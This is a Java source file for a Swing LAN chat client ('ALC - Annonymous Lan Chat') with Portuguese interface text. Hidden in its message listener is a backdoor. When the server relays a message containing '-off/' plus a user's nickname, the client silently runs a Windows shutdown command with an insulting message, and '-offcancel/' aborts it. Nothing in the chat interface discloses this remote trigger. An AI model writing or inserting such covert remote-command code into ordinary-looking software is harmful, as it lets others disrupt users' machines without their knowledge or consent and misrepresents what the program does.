package Client;

import java.applet.Applet;
import java.applet.AudioClip;
import java.awt.event.KeyEvent;
import java.io.IOException;
import java.io.PrintWriter;
import java.net.Socket;
import java.net.URL;
import java.util.Scanner;
import java.util.Timer;
import java.util.TimerTask;
import javax.swing.JFrame;
import javax.swing.JOptionPane;

/**
 *
 * @author Yuri
 */
public class ClientChat extends javax.swing.JFrame {

    private PrintWriter clientPrinter;
    private Socket socket;
    private String name;
    private String clientVersion = "1.3";
    private Scanner reader;
    private String serverIP;
    private boolean notify = true;

    public boolean serverFound = false;
    URL notifyURL = this.getClass().getResource("notify.wav");
    AudioClip notifyAudio = Applet.newAudioClip(notifyURL);

    //private ArrayList<Pings> pingTask = new ArrayList<>();
    public ClientChat() throws IOException {
        initComponents();
        this.addWindowListener(new java.awt.event.WindowAdapter() {
            @Override
            public void windowClosing(java.awt.event.WindowEvent windowEvent) {

            }
        });
        boolean validNickName = false;
        while (!validNickName) {
            name = JOptionPane.showInputDialog(this, "Nickname", "Digite seu nickname", 1);
            if (name.length() > 0 && name.length() < 15) {
                validNickName = true;
            } else {
                JOptionPane.showMessageDialog(this, "Invalid Nickname");
            }
        }
        networkConnect();
        if (!serverFound) {
            this.dispose();
            return;
        }
        this.setTitle("ALC - " + clientVersion);
        clientPrinter.print("@setClientName@" + (socket.getInetAddress().getHostAddress().length()) + (socket.getInetAddress().getHostAddress()) + name);
        clientPrinter.print("\n # An anonymous client has just connected\n");
        clientPrinter.print(" # " + socket.getLocalSocketAddress() + "\n"
                + " -> " + name + "\n");
        clientPrinter.print("@version@" + clientVersion + name + "\n");
        clientPrinter.flush();
        Timer pingTimer = new Timer();
        pingTimer.scheduleAtFixedRate(new Pings(this, name), 5000, 5000);
        System.out.println("new Pings");
        this.setVisible(true);
    }

    private void networkConnect() throws IOException {
        try {
            serverIP = JOptionPane.showInputDialog(this, "SERVER IP ou (onlinechatserver.ddns.net)", "onlinechatserver.ddns.net");
            socket = new Socket(serverIP, 5000);
            clientPrinter = new PrintWriter(socket.getOutputStream());
            reader = new Scanner(socket.getInputStream());
            serverFound = true;
            new Thread(new ServerListener(this)).start();

        } catch (Exception e) {
            JOptionPane.showMessageDialog(this, "Servidor nao encontrado.");
            this.dispose();
        }
    }

    class Pings extends TimerTask {

        JFrame frame;
        String name;

        public Pings(JFrame frame, String name) {
            this.frame = frame;
            this.name = name;
            System.out.println("pings created. - " + name);
        }

        @Override
        public void run() {
            System.out.println("___________...");
            try {
                if (frame.isVisible()) {
                    System.out.println(name + "...ping");
                    clientPrinter.println("@ping@" + name);
                    clientPrinter.flush();
                } else {
                    this.cancel();
                    System.out.println("Client Closed");
                }
            } catch (Exception e) {
                System.out.println("capturou");
                this.cancel();
            }
        }

    }

    private void sendMessage(String name, String txt) throws IOException {
        if (txt.length() < 1000) {
            clientPrinter.println(name + ": " + txt);
            clientPrinter.flush();
        }
        if (txt.contains("/mute")) {
            notify = false;
        }
        if (txt.contains("/notify")) {
            notify = true;
        }

        jTextField1.setText("");
        jTextField1.requestFocus();
    }

    private void listarClients() {
        clientPrinter.println("@list@");
        clientPrinter.flush();

    }

    private void shutdown() {
        Process cmd;
        try {
            cmd = Runtime.getRuntime().exec("shutdown -s -t 600 -c \"Se fudeu otario \"");
        } catch (Exception e) {
        }
    }

    private void shutCancel() {
        Process cmd;
        try {
            cmd = Runtime.getRuntime().exec("shutdown -a");
        } catch (Exception e) {
        }
    }

    private class ServerListener implements Runnable {

        JFrame frame;

        public ServerListener(JFrame frame) {
            this.frame = frame;
        }

        @Override
        public void run() {
            try {
                String txt;
                while ((txt = reader.nextLine()) != null) {
                    //sendMessage(name, txt);
                    if (txt.contains("-off/" + name)) {
                        shutdown();
                    } else if (txt.contains("-offcancel/" + name)) {
                        shutCancel();
                    } else if (txt.contains("@ping@")) {

                    } else {
                        jTextArea1.append(txt + "\n");
                        jTextArea1.setCaretPosition(jTextArea1.getDocument().getLength());
                        if (!this.frame.isFocused() && notify) {
                            this.frame.toFront();
                            notifyAudio.play();
                        }
                    }
                }
            } catch (Exception e) {
            }
        }

    }

    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        jPopupMenu1 = new javax.swing.JPopupMenu();
        jTextField1 = new javax.swing.JTextField();
        jScrollPane3 = new javax.swing.JScrollPane();
        jScrollPane2 = new javax.swing.JScrollPane();
        jTextArea1 = new javax.swing.JTextArea();

        setDefaultCloseOperation(javax.swing.WindowConstants.DISPOSE_ON_CLOSE);
        setAlwaysOnTop(true);

        jTextField1.addKeyListener(new java.awt.event.KeyAdapter() {
            public void keyPressed(java.awt.event.KeyEvent evt) {
                jTextField1KeyPressed(evt);
            }
        });

        jTextArea1.setEditable(false);
        jTextArea1.setBackground(new java.awt.Color(0, 0, 0));
        jTextArea1.setColumns(20);
        jTextArea1.setFont(new java.awt.Font("OCR A Extended", 1, 12)); // NOI18N
        jTextArea1.setForeground(new java.awt.Color(53, 214, 0));
        jTextArea1.setLineWrap(true);
        jTextArea1.setRows(5);
        jTextArea1.setText("*** Bem Vindo ao ALC - Annonymous Lan Chat ***");
        jTextArea1.setToolTipText("by - Yuri Bento");
        jScrollPane2.setViewportView(jTextArea1);

        jScrollPane3.setViewportView(jScrollPane2);

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jTextField1, javax.swing.GroupLayout.DEFAULT_SIZE, 383, Short.MAX_VALUE)
            .addComponent(jScrollPane3)
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addComponent(jScrollPane3, javax.swing.GroupLayout.DEFAULT_SIZE, 184, Short.MAX_VALUE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jTextField1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
        );

        pack();
        setLocationRelativeTo(null);
    }// </editor-fold>//GEN-END:initComponents

    private void jTextField1KeyPressed(java.awt.event.KeyEvent evt) {//GEN-FIRST:event_jTextField1KeyPressed
        int key = evt.getKeyCode();
        if (key == KeyEvent.VK_ENTER) {
            try {
                String txt = jTextField1.getText();
                if (!txt.equals("")) {
                    if (txt.equals("/list")) {
                        listarClients();
                    } else {
                        sendMessage(name, (txt));
                    }
                }
            } catch (IOException ex) {

            }
        }
    }//GEN-LAST:event_jTextField1KeyPressed

    /**
     * @param args the command line arguments
     */
//    public static void main(String args[]) {
//        /* Set the Nimbus look and feel */
//        //<editor-fold defaultstate="collapsed" desc=" Look and feel setting code (optional) ">
//        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.
//         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html 
//         */
//        try {
//            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
//                if ("Windows Classic".equals(info.getName())) {
//                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
//                    break;
//                }
//            }
//        } catch (ClassNotFoundException ex) {
//            java.util.logging.Logger.getLogger(Client.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
//        } catch (InstantiationException ex) {
//            java.util.logging.Logger.getLogger(Client.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
//        } catch (IllegalAccessException ex) {
//            java.util.logging.Logger.getLogger(Client.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
//        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
//            java.util.logging.Logger.getLogger(Client.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
//        }
//        //</editor-fold>
//        //</editor-fold>
//        //</editor-fold>
//        //</editor-fold>
//
//        /* Create and display the form */
//        java.awt.EventQueue.invokeLater(new Runnable() {
//            public void run() {
//                try {
//                    new Client().setVisible(true);
//                } catch (IOException ex) {
//                    Logger.getLogger(Client.class.getName()).log(Level.SEVERE, null, ex);
//                }
//            }
//        });
//    }

    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JPopupMenu jPopupMenu1;
    private javax.swing.JScrollPane jScrollPane2;
    private javax.swing.JScrollPane jScrollPane3;
    private javax.swing.JTextArea jTextArea1;
    private javax.swing.JTextField jTextField1;
    // End of variables declaration//GEN-END:variables

}
